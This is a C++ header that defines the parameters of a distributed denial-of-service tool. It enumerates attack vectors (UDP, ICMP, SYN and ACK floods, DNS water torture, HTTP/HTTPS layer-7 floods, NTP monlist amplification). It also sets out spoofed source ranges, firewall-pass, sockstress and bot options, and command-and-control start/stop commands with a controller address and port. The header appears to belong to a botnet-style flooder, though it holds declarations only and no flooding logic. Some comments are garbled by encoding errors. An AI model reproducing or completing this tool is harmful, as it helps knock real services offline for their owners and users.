
#ifndef _DDOS_PARAMS_H
#define _DDOS_PARAMS_H

#include "pktbuild.h"

typedef enum{
    ATK_VEC_INVALID = 0,
    ATK_VEC_UDP,  /* Straight up UDP flood */
	ATK_VEC_ICMP, /* ICMP flood */
    ATK_VEC_DNS,  /* DNS water torture */
    ATK_VEC_SYN,  /* SYN flood with options */
    ATK_VEC_ACK,  /* ACK flood */
    ATK_VEC_HTTP, /* HTTP layer 7 flood */
    ATK_VEC_HTTPS, /* HTTPS layer 7 flood */
    ATK_VEC_NTP,
    ATK_VEC_MAX
}ATTACK_VECTOR;

typedef enum{
	PAYLOAD_HEX ,
	PAYLOAD_ASCII
}PAYLOAD_TYPE;





/*--speed 1000 --duration 60 --count 250 --thread 3
--sip x.x.x.x/x --dip x.x.x.x/x --sport xx --dport xx
--tcpflag xx
--domain xxxxxx.com
--path xxxxx
--method GET|POST
--paylen 250
--vlan 250
--ttl 63
--fw
--conn 250
--browser
--bot
*/
typedef enum{
    P_SPEED = 0,
    P_DURATION = 1,
    P_COUNT = 2,
    P_THREAD = 3,
    P_SIP = 4,
    P_DIP = 5,
    P_SPORT = 6,
    P_DPORT = 7,
    P_TCPFLAG = 8,
    P_DOMAIN = 9,
    P_PATH = 10,
    P_METHOD = 11,
    P_PAYLEN = 12,
    P_VLAN = 13,
    P_TTL = 14,
    P_ACK_FW = 15,
    P_ACK_SOCK = 16,
    P_ACK_BOT = 17,
    P_CONN = 18,
    P_BROWSER = 19,
    P_NTP_MONLIST = 20,
	P_HTTP_ACTION = 21,
	P_SIP_ACTION = 22,
	P_ICMP_TYPE = 23,
	
}ATTACK_PARAM;

#define NOLIMIT_SPEED  (uint32_t)(-1)
#define NOLIMIT_COUNT  (uint32_t)(-1)
#define NOLIMIT_DURATION  (uint32_t)(-1)
#define MAX_THRD_CNT  20
#define MAX_CONCUR_CNT 65535

#define MAX_DOMAIN_LEN 256


enum
{
    CNC_CMD_START = 1,
    CNC_CMD_STOP = 2,
};

class CDDoSParam {
    public:
        CDDoSParam();
        virtual ~CDDoSParam(){			
			delete[] m_payload_data;
			m_payload_data = NULL;
			
			//delete [] m_options;
			//m_options = NULL;
		};
	CDDoSParam& operator = (const CDDoSParam& param){
		if(this!= &param){
	        m_type = param.m_type;
			m_speed= param.m_speed;
			m_duration= param.m_duration;
			m_total_cnt= param.m_total_cnt;
			
			m_srcnet= param.m_srcnet;
			m_dstnet= param.m_dstnet;
			
			m_srcnet6= param.m_srcnet6;
			m_dstnet6= param.m_dstnet6;


			m_srcport= param.m_srcport;
			m_dstport= param.m_dstport;

			
			
			m_identity= param.m_identity;
			m_tcpflag= param.m_tcpflag;
			m_tcpoptionflag = param.m_tcpoptionflag;

            for(int i=0; i<40; i++){
				m_tcp_options[i] = param.m_tcp_options[i];
			}

			
			m_issyn64= param.m_issyn64;
			m_is_random_domain= param.m_is_random_domain;
			
			util_strncpy(m_domain, const_cast<char*>(param.m_domain), 255);
			util_strncpy(m_http_path, const_cast<char*>(param.m_http_path), 255);
			util_strncpy(m_http_method, const_cast<char*>(param.m_http_method), 32);
			
			util_strncpy(m_relay_ip, const_cast<char*>(param.m_relay_ip), 15); //
			util_strncpy(m_client_ip_mac, const_cast<char*>(param.m_client_ip_mac), 32);//m_options
			util_strncpy(m_options, const_cast<char*>(param.m_options), 512);
			util_strncpy(m_ipv6_address, const_cast<char*>(param.m_ipv6_address), 512);
			util_strncpy(m_ipv4_address, const_cast<char*>(param.m_ipv4_address), 15); //
			util_strncpy(m_server_id_duid, const_cast<char*>(param.m_server_id_duid), 36);						
			util_strncpy(m_client_id_duid, const_cast<char*>(param.m_client_id_duid), 36);
			util_strncpy(m_iaid, const_cast<char*>(param.m_iaid), 8);

			m_vlan_id= param.m_vlan_id;
			m_payload_len= param.m_payload_len;
			m_payload_type= param.m_payload_type;
			m_ttl= param.m_ttl;
	        m_dont_frag= param.m_dont_frag;
			m_http_action= param.m_http_action;  
			m_https_action= param.m_https_action; 
			m_sip_action= param.m_sip_action;  
			m_icmp_type= param.m_icmp_type; 
			m_mac_start = param.m_mac_start;

			m_msg_type = param.m_msg_type;

	        m_is_passfw= param.m_is_passfw;
	        m_is_sockstress= param.m_is_sockstress;
	        m_is_bot= param.m_is_bot;
	        m_concurrent_cnt= param.m_concurrent_cnt;
	        m_is_browser= param.m_is_browser;

	        m_ntp_monlist= param.m_ntp_monlist;
			m_prefix_delegetion = param.m_prefix_delegetion;
			m_ia_ta = param.m_ia_ta;
			m_bootp = param.m_bootp;

			

			delete[] m_payload_data;
			m_payload_len = param.m_payload_len;
			this->set_payload_data(param.m_payload_data, param.m_payload_len);
			util_strncpy(m_json_name, const_cast<char*>(param.m_json_name), 255);

			m_ip_type =  param.m_ip_type;
			m_iph_proto =  param.m_iph_proto;

			if(m_ip_type == IP_V6 &&m_icmp_type ==8){
				m_icmp_type=128; //128 echo 129 replay
			}
		}
		return *this;
	}

    public:
        uint32_t m_type;

        uint32_t m_speed;
        uint32_t m_duration;
        uint64_t m_total_cnt;

        HOST_RANGE_T m_srcnet;
        HOST_RANGE_T m_dstnet;
        HOST_RANGE6_T m_srcnet6;
        HOST_RANGE6_T m_dstnet6;

        PORT_RANGE_T m_srcport;
        PORT_RANGE_T m_dstport;

        uint32_t m_identity;
        uint8_t m_tcpflag;
		uint8_t m_tcpoptionflag;//tcp 的可选项 0 代表无可选项 1代表默认可选项 其他代表长度 长度必须为n%4=0 
		char m_tcp_options[40]; //最大长度为40
        bool m_issyn64;
        bool m_is_random_domain;

        char m_domain[MAX_DOMAIN_LEN + 1];
        char m_http_path[256];
        char m_http_method[32];

        uint32_t m_vlan_id;
        uint32_t m_payload_len;
		uint32_t m_payload_type;
		
		char * m_payload_data;
		char m_relay_ip[16];
		char m_client_ip_mac[13];
		char m_options[512];
		char m_ipv6_address[513];  //请求的ipv6的地址
		char m_ipv4_address[16];   //ipv4报文中请求的ipv4地址
		char m_server_id_duid[37];
		char m_client_id_duid[37];
		char m_iaid[9];
		
        uint8_t m_ttl;
        uint32_t m_dont_frag;
		uint8_t m_http_action;  //http get��post�ֶΣ�m_http_action=0 ��ʾget, m_http_action=0 ��ʾpost
		uint8_t m_https_action; 
		uint8_t m_sip_action;   // sip INVITE��REGISTER�ֶΣ� m_sip_action=0 ��ʾINVITE, m_sip_action=1 ��ʾREGISTER
		uint8_t m_icmp_type;   //icmptype=0 ��ʾreply, icmptype=8 ��ʾrequest
		uint32_t m_mac_start;   //mac地址起始的标志位

 
        bool m_is_passfw;
        bool m_is_sockstress;
        bool m_is_bot;
        uint32_t m_concurrent_cnt;
        bool m_is_browser;

        bool m_ntp_monlist;
		char m_json_name[256];
		uint8_t m_ip_type; //ipv6 or ipv4
		uint8_t m_iph_proto; //ip头部负责标志各协议的字段 tcp udp 等
		uint8_t m_msg_type;
		bool m_prefix_delegetion;
		bool m_ia_ta;
		bool m_bootp;

		
		
public:
    int params_check();
	int set_payload_data(char* str, uint32_t len);
};

extern uint32_t g_cnc_addr;
extern uint16_t g_cnc_port;
extern uint32_t g_thrd_cnt;

#endif
